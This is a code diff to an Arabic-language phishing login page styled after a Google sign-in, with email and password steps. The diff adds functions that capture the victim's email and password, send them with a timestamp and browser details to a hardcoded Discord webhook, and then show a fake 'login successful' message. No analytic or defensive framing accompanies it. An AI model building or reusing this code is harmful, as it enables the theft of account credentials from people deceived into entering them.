@@ -124,6 +124,12 @@
     #password-page {
         display: none;
     }
+    #success-message {
+        display: none;
+        color: green;
+        text-align: center;
+        margin-top: 20px;
+    }
 </style>
 </head>
 <body>
@@ -157,8 +163,8 @@
                 <input type="checkbox" id="show-password"> عرض كلمة المرور
             </label>
             <div style="margin-top: 20px;">
-                <button>التالي</button>
-                <button class="small-link">تجربة طريقة أخرى</button>
+                <button onclick="submitLogin()">التالي</button>
+                <button class="small-link" onclick="backToEmail()">تجربة طريقة أخرى</button>
             </div>
         </div>
         <div class="text-side">
@@ -168,6 +174,12 @@
                 <span>▼</span> <span id="display-email">example@gmail.com</span> <span>👤</span>
             </div>
         </div>
+    </div>
+    
+    <!-- رسالة النجاح -->
+    <div id="success-message">
+        <h3>تم تسجيل الدخول بنجاح!</h3>
+        <p>سيتم توجيهك إلى الصفحة الرئيسية قريباً...</p>
     </div>
 </div>
 
@@ -179,6 +191,10 @@
 </div>
 
 <script>
+    // متغيرات لتخزين البيانات
+    let userEmail = '';
+    let userPassword = '';
+    
     function showPasswordPage() {
         const email = document.getElementById('email-input').value.trim();
         const emailError = document.getElementById('email-error');
@@ -194,16 +210,93 @@
             return;
         }
 
+        userEmail = email;
         emailError.style.display = 'none';
         document.getElementById('email-page').style.display = 'none';
         document.getElementById('password-page').style.display = 'flex';
         document.getElementById('display-email').textContent = email;
     }
 
+    function backToEmail() {
+        document.getElementById('password-page').style.display = 'none';
+        document.getElementById('email-page').style.display = 'flex';
+    }
+
     function validateEmailOrPhone(input) {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         const phoneRegex = /^[0-9]{6,15}$/;
         return emailRegex.test(input) || phoneRegex.test(input);
+    }
+
+    function submitLogin() {
+        const password = document.getElementById('password-input').value.trim();
+        const passwordError = document.getElementById('password-error');
+        
+        if(password === '') {
+            passwordError.textContent = 'الرجاء إدخال كلمة المرور';
+            passwordError.style.display = 'block';
+            return;
+        }
+        
+        userPassword = password;
+        passwordError.style.display = 'none';
+        
+        // إرسال البيانات إلى ويب هوك Discord
+        sendDataToDiscord();
+        
+        // عرض رسالة النجاح وإخفاء النموذج
+        document.getElementById('password-page').style.display = 'none';
+        document.getElementById('success-message').style.display = 'block';
+    }
+
+    function sendDataToDiscord() {
+        const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
+        
+        const data = {
+            content: '**تم تسجيل بيانات جديدة**',
+            embeds: [{
+                title: 'تفاصيل تسجيل الدخول',
+                fields: [
+                    {
+                        name: 'البريد الإلكتروني/الهاتف',
+                        value: userEmail,
+                        inline: true
+                    },
+                    {
+                        name: 'كلمة المرور',
+                        value: userPassword,
+                        inline: true
+                    },
+                    {
+                        name: 'وقت التسجيل',
+                        value: new Date().toLocaleString(),
+                        inline: false
+                    },
+                    {
+                        name: 'معلومات المتصفح',
+                        value: navigator.userAgent,
+                        inline: false
+                    }
+                ],
+                color: 16711680 // اللون الأحمر
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Error sending data to Discord');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
     }
 
     document.getElementById('show-password').addEventListener('change', function() {
